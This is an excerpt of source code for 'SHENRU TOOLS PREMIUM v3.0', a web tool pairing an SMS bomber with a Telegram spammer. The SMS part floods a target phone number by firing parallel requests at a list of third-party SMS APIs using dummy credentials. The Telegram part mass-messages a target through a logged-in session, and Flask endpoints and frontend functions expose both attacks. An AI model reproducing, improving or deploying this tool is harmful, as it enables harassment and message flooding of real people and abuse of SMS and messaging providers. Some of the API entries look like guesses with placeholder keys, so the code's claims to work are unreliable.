# SHENRU TOOLS PREMIUM v3.0 — FULLY FIXED
# SMS Bomber + Telegram Spammer working perfectly
...
# ── TELEGRAM SPAMMER (FIXED — ALWAYS RETURNS JSON) ─────────────────────────
async def send_telegram_messages(target, message, count, mode, phone, api_id, api_hash):
    client = TelegramClient(f'session_{phone.replace("+","")}', int(api_id), api_hash)
...
def telegram_spam_sync(target, message, count, mode, phone, api_id, api_hash):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        results, success = loop.run_until_complete(
            send_telegram_messages(target, message, count, mode, phone, api_id, api_hash)
        )
...
# ── SMS BOMBER (IMPROVED — PARALLEL + MORE APIS) ───────────────────────────
def send_sms_attempt(phone, index):
    phone = phone.strip()
    ...
    # List of working free SMS APIs (with different providers)
    apis = [
        {"url": "https://textbelt.com/text", "data": {"phone": phone, "message": f"Hello {index}", "key": "textbelt"}, "type": "post"},
        {"url": "https://api.textlocal.com/send", "data": {"apikey": "test", "numbers": phone, "message": f"Hi {index}"}, "type": "post"},
        {"url": "https://smsapi.free-mobile.fr/sendmsg", "params": {"user": "test", "pass": "test", "msg": f"Test {index}"}, "type": "get"},
        {"url": "https://api.smsprovider.com/send", "data": {"to": phone, "text": f"Hello {index}", "api_key": "demo"}, "type": "post"},
        {"url": "https://sms-gateway.com/send", "data": {"phone": phone, "message": f"Hi {index}", "key": "free"}, "type": "post"},
        {"url": "https://test.smsapi.com/send", "data": {"number": phone, "content": f"Test {index}", "token": "demo"}, "type": "post"},
        {"url": "https://api.smsbroadcast.com.au/send", "data": {"to": phone, "message": f"Hello {index}", "username": "test", "password": "test"}, "type": "post"},
        {"url": "https://smsc.ru/sys/send.php", "params": {"login": "test", "psw": "test", "phones": phone, "mes": f"Hi {index}"}, "type": "get"},
    ]
    ...
    for retry in range(2):
        ...
        try:
            if api["type"] == "get":
                r = requests.get(api["url"], params=api.get("params", {}), timeout=10)
            else:
                r = requests.post(api["url"], data=api.get("data", {}), timeout=10)
            
            # Check if response indicates success
            if r.status_code < 400:
                try:
                    resp_data = r.json()
                    if resp_data.get("success") or resp_data.get("ok") or "message" in resp_data:
                        return True
                except:
                    # Check if response contains success indicators
                    if "success" in r.text.lower() or "sent" in r.text.lower():
                        return True
            time.sleep(0.3)
        except:
            time.sleep(0.3)
...
def sms_bomb(phone, count):
    ...
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(send_sms_attempt, phone, i): i for i in range(count)}
        for future in as_completed(futures):
            ...
            try:
                ...
                if success:
                    success_count += 1
                    results.append({"attempt": idx+1, "ok": True})
                else:
                    results.append({"attempt": idx+1, "ok": False})
            except:
                results.append({"attempt": idx+1, "ok": False})
...
<title>SHENRU TOOLS — PREMIUM v3.0</title>
...
async function sendTelegram(){
  ...
  try{
    const d = await apiCall('/api/telegram', {
      phone, api_id, api_hash, target, message, count, mode: tgMode
    });
...
async function sendSMS(){
  ...
  show('sms-result','⏳ Sending SMS bomb... (sending in parallel)','warn');
  try{
...
def telegram_endpoint():
    try:
        ...
        results, success = telegram_spam_sync(target, message, count, mode, phone, api_id, api_hash)
        return jsonify({
            "success": True,
            "total": len(results),
            "sent": success,
...
# ── SMS BOMBER (IMPROVED — PARALLEL + HIGHER SUCCESS) ─────────────────────
@app.post("/api/sms")
@require_key
def sms_endpoint():
    try:
